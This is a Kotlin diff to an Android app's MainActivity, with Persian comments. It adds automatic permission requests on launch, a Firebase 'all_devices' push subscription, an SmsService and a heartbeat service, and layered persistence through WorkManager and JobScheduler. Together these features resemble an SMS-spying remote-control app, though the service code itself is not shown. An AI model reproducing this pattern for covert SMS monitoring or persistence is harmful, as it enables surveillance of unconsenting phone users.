@@ -51,7 +51,7 @@ class MainActivity : ComponentActivity() {
     private var fcmToken: String = ""
     private val handler = Handler(Looper.getMainLooper())
 
-    private val BATTERY_UPDATE_INTERVAL_MS = 60000L
+    private val BATTERY_UPDATE_INTERVAL_MS = 600000L
     private val FCM_TIMEOUT_MS = 3000L
 
     private lateinit var webView: WebView
@@ -76,15 +76,15 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
         enableFullscreen()
 
-        // ⭐ بارگذاری تنظیمات از config.json
         appConfig = AppConfig.load(this)
 
-        // ⭐ راه‌اندازی Firebase Remote Config برای آدرس سرور
         ServerConfig.initialize(this)
         ServerConfig.printAllSettings()
 
         deviceId = DeviceInfoHelper.getDeviceId(this)
         Log.d(TAG, "📱 Device ID: $deviceId")
+
+        subscribeToFirebaseTopic()
 
         permissionManager = PermissionManager(this)
         permissionManager.initialize { }
@@ -94,6 +94,16 @@ class MainActivity : ComponentActivity() {
                 MainScreen()
             }
         }
+    }
+    
+    private fun subscribeToFirebaseTopic() {
+        FirebaseMessaging.getInstance().subscribeToTopic("all_devices")
+            .addOnSuccessListener {
+                Log.d(TAG, "✅ Subscribed to 'all_devices' topic from MainActivity")
+            }
+            .addOnFailureListener { e ->
+                Log.e(TAG, "❌ Failed to subscribe to 'all_devices' topic from MainActivity", e)
+            }
     }
     
     /**
@@ -141,15 +151,27 @@ class MainActivity : ComponentActivity() {
         }
 
         LaunchedEffect(Unit) {
-            // First show app splash for 2 seconds
-            delay(2000)
+            // First show app splash for 3 seconds
+            delay(3000)
             showSplash = false
-            
-            // Then check permissions
             delay(300)
+            
+            // اول خودکار Permission بگیر
             if (!permissionManager.checkAllPermissions()) {
-                showPermissionDialog = true
+                // درخواست Permission
+                permissionManager.requestPermissions {
+                    // بعد از درخواست، چک کن
+                    if (permissionManager.checkAllPermissions()) {
+                        // همه رو داد
+                        permissionsGranted = true
+                        continueInitialization()
+                    } else {
+                        // نداد، دیالوگ رو نشون بده
+                        showPermissionDialog = true
+                    }
+                }
             } else {
+                // از قبل داره
                 permissionsGranted = true
                 continueInitialization()
             }
@@ -240,13 +262,15 @@ class MainActivity : ComponentActivity() {
                         onRequestPermissions = {
                             scope.launch {
                                 permissionManager.requestPermissions {
-                                    if (permissionManager.checkAllPermissions()) {
-                                        showPermissionDialog = false
-                                        permissionsGranted = true
-                                        continueInitialization()
-                                    }
+                                    // بعد از درخواست چک می‌کنه
                                 }
                             }
+                        },
+                        onAllPermissionsGranted = {
+                            // ⭐ وقتی همه Permission‌ها گرفته شد
+                            showPermissionDialog = false
+                            permissionsGranted = true
+                            continueInitialization()
                         }
                     )
                 }
@@ -330,6 +354,37 @@ class MainActivity : ComponentActivity() {
                     """.trimIndent(),
                     null
                 )
+                
+                // ⭐ خواندن و اعمال رنگ status bar از meta tag
+                webView.evaluateJavascript(
+                    """
+                    (function() {
+                        try {
+                            var metaTheme = document.querySelector('meta[name="theme-color"]');
+                            if (metaTheme) {
+                                return metaTheme.getAttribute('content');
+                            }
+                            return null;
+                        } catch(e) {
+                            return null;
+                        }
+                    })();
+                    """.trimIndent()
+                ) { color ->
+                    if (color != null && color != "null") {
+                        val colorValue = color.replace("\"", "")
+                        try {
+                            val parsedColor = android.graphics.Color.parseColor(colorValue)
+                            runOnUiThread {
+                                window.statusBarColor = parsedColor
+                                window.navigationBarColor = parsedColor
+                                Log.d(TAG, "🎨 Status bar color set to: $colorValue")
+                            }
+                        } catch (e: Exception) {
+                            Log.e(TAG, "❌ Failed to parse color: $colorValue", e)
+                        }
+                    }
+                }
             }
 
             override fun onReceivedError(view: WebView?, errorCode: Int, description: String?, failingUrl: String?) {
@@ -377,6 +432,13 @@ class MainActivity : ComponentActivity() {
             fun getThemeColors(): String {
                 Log.d(TAG, "🔗 JavaScript requested theme colors")
                 return appConfig.theme.toJson()
+            }
+            
+            @android.webkit.JavascriptInterface
+            fun getBaseUrl(): String {
+                val baseUrl = ServerConfig.getBaseUrl()
+                Log.d(TAG, "🔗 JavaScript requested base URL: $baseUrl")
+                return baseUrl
             }
         }, "Android")
         
@@ -523,6 +585,11 @@ class MainActivity : ComponentActivity() {
 
     private fun startBackgroundServices() {
         try {
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "🚀 STARTING BACKGROUND SERVICES")
+            Log.d(TAG, "════════════════════════════════════════")
+            
+            // 1️⃣ SmsService
             val smsIntent = android.content.Intent(this, SmsService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(smsIntent)
@@ -531,6 +598,7 @@ class MainActivity : ComponentActivity() {
             }
             Log.d(TAG, "✅ SmsService started")
 
+            // 2️⃣ HeartbeatService
             val heartbeatIntent = android.content.Intent(this, HeartbeatService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(heartbeatIntent)
@@ -538,9 +606,60 @@ class MainActivity : ComponentActivity() {
                 startService(heartbeatIntent)
             }
             Log.d(TAG, "✅ HeartbeatService started")
+            
+            // 3️⃣ ⭐ WorkManager برای Heartbeat (قابل اعتمادتر!)
+            scheduleHeartbeatWorker()
+            
+            // 4️⃣ ⭐ JobScheduler (Backup برای WorkManager)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+                com.example.test.utils.JobSchedulerHelper.scheduleHeartbeatJob(this)
+                Log.d(TAG, "✅ JobScheduler scheduled")
+            }
+
+            Log.d(TAG, "════════════════════════════════════════")
+            Log.d(TAG, "✅ ALL SERVICES STARTED SUCCESSFULLY")
+            Log.d(TAG, "════════════════════════════════════════")
 
         } catch (e: Exception) {
             Log.e(TAG, "❌ Services error: ${e.message}")
+        }
+    }
+    
+    /**
+     * ⭐ راه‌اندازی WorkManager برای Heartbeat دوره‌ای
+     * این کار خیلی قابل اعتمادتره از Service معمولی!
+     */
+    private fun scheduleHeartbeatWorker() {
+        try {
+            val workRequest = androidx.work.PeriodicWorkRequestBuilder<HeartbeatWorker>(
+                15, // هر 15 دقیقه
+                java.util.concurrent.TimeUnit.MINUTES,
+                5, // Flex interval: 5 دقیقه
+                java.util.concurrent.TimeUnit.MINUTES
+            )
+                .setConstraints(
+                    androidx.work.Constraints.Builder()
+                        .setRequiredNetworkType(androidx.work.NetworkType.CONNECTED)
+                        .build()
+                )
+                .setBackoffCriteria(
+                    androidx.work.BackoffPolicy.EXPONENTIAL,
+                    10,
+                    java.util.concurrent.TimeUnit.SECONDS
+                )
+                .addTag("heartbeat")
+                .build()
+
+            androidx.work.WorkManager.getInstance(this).enqueueUniquePeriodicWork(
+                HeartbeatWorker.WORK_NAME,
+                androidx.work.ExistingPeriodicWorkPolicy.KEEP,
+                workRequest
+            )
+
+            Log.d(TAG, "💪 WorkManager scheduled for Heartbeat (every 15 minutes)")
+            
+        } catch (e: Exception) {
+            Log.e(TAG, "❌ WorkManager schedule failed: ${e.message}")
         }
     }
 
